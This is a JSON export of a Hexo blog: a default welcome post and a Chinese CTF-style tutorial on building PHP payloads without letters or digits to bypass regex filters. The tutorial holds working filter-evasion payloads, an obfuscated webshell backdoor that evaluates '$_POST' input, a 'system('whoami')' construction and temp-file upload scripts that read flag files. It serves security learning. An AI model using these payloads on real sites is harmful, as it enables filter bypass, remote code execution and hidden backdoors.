[{"title":"Hello World","url":"/2021/11/29/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\nimage Test\n利贺田\n"},{"title":"php无字母数字构造-入门级","url":"/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/","content":"1    前置知识1.1    php中的正则匹配函数最常见的preg_grep()\npreg_grep(string $pattern, array $array, int $flags = 0): array|false\n返回给定数组array中与模式pattern 匹配的元素组成的数组\n其余的正则函数可以在https://www.runoob.com/php/php-pcre.html里学习\n1.2     正则匹配式正则表达式手册：https://tool.oschina.net/uploads/apidocs/jquery/regexp.html\nhttps://www.runoob.com/regexp/regexp-tutorial.html\n动态调试正则表达式的网站：https://regex101.com/\n中文在线调试：https://c.runoob.com/front-end/854/\n尝试阅读几个正则表达式：\n/^[a-z0-9_-]&#123;3,16&#125;$/\t\t用来过滤用户名/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/\t\t匹配ip地址/^[a-z\\d]+(\\.[a-z\\d]+)*@([\\da-z](-[\\da-z])?)+(\\.&#123;1,2&#125;[a-z]+)+$/电子邮箱\n\n1.3    php中的位运算在构造字符绕正则的时候，我们常用位运算符来帮助我们构造\nphp位运算符：https://blog.csdn.net/qq_28602957/article/details/52141431\n2    无字母数字构造2.1    无字母数字基础&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;\n\n\nphp5\n修饰符i，s：https://www.runoob.com/regexp/regexp-flags.html\n\n异或拼接：\n（来自p牛博客\n&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]);\n\n(很多不可打印字符，用url编码表示)\n异或:\n(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();\n\n这样可以phpinfo\n倘若过滤了引号：\n$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo\n\n%86%86%86%86^%d9%c1%c3%d2构造出_GET,php中可以这样构造参数,花括号在数组中可以索引：\n$_GET&#123;2&#125;\n\n\n\n一个非数字字母的php后门（使用异或）：\n// demo1.php&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;\n\n拼接_POST:\n$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);\n\n更短的字符：\n&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot; //_GET&quot;#./|&#123;&quot;^&quot;|~`//&quot; //_POST\n\n\n\n或：\n(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();\n\n这样可以phpinfo\n(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);\n\nsystem(‘whoami’); 可以rce\n取反：\n(~%8F%97%8F%96%91%99%90)();\n\n可phpinfo\nutf-8下取中文字符取反：\nUTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\\x8c”，其取反即为字母s\n&lt;?php$_=&quot;和&quot;;print(~($_&#123;2&#125;));print(~&quot;\\x8c&quot;);?&gt;\n\n脚本生成：\n&gt;&gt;&gt; def get(shell):...     hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))...     print(hexbit)...&gt;&gt;&gt; get(&#x27;phpinfo&#x27;)0x8f0x970x8f0x960x910x990x90\n\n\n\n自增：\n‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。\n文档：http://php.net/manual/zh/language.operators.increment.php\n如何拿到一个值为字符串’a’的变量呢？\n数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：\n&lt;?phpecho &#x27;&#x27;.[];//Array\n\n构造：ASSERT($_POST[_]);\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#xn\n\n\n//测试发现7.0.12以上版本不可使用//使用时需要url编码下$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);固定格式 构造出来的 assert($_POST[_]);然后post传入   _=phpinfo();\n\n\n\n不用数字构造数字：\necho (&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);//2echo true+true;//2\n\n或者：\n&lt;?php$_++;print($_); // 1?&gt;php中未定义的变量默认值为null，nullfalse0\n\n\n\n2.2    长度限制&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;        die(&quot;NO.&quot;);    &#125;    eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\nphp7:\nPHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。\n(~%8F%97%8F%96%91%99%90)();\n\n\n\nphp5:\n上传临时文件：\nimport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files=&#123;&#x27;file&#x27;:&#x27;cat f*&#x27;&#125;response=requests.post(url,files=files)html = response.textprint(html)\n\n具体原理看p神文章可了解详细\nglob通配符：https://man7.org/linux/man-pages/man7/glob.7.html\n2.3    过滤下划线&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;50)&#123;        die(&quot;Too Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code))&#123;        die(&quot;Not Allowed.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;\n\n\n\n异或：\n?code=(&#x27;$&#x27;).(&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;).([&#x27;+&#x27;])&amp;+=getFlag();\n\n这样是错误的，因为eval只能解析一遍代码，而此时中间的拼接就会成为第一遍解析的运算\n正确的payload为：\n?code=$&#123;&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;&#125;[&#x27;+&#x27;]();&amp;+=getFlag\n\n这里利用了**${}**中的代码是可以执行的特点，其实也就是可变变量。\n示例：\n&lt;?php    $a = &#x27;hello&#x27;;    $$a = &#x27;world&#x27;;    echo &quot;$a $&#123;$a&#125;&quot;;?&gt;        &gt;&gt;hello world\n\n\n\n取反：\n?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag其中24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B = $&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125; = $_GET~在&#123;&#125;中执行了取反操作\n\n\n\n2.4    过滤$字符&lt;?php include &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;    die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))    &#123;        die(&quot;NO.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint=&quot;php function getFlag() to get flag&quot;;?&gt;\n\npayload:\ncode=?&gt;&lt;?=`/???/??? ????.???`?&gt;/???/???通配``/bin/cat，???.???通配flag.php`\n\n\n\n\n\n参考：\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nhttps://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/\nhttps://blog.csdn.net/miuzzx/article/details/109143413\n","categories":["web"],"tags":["php"]}]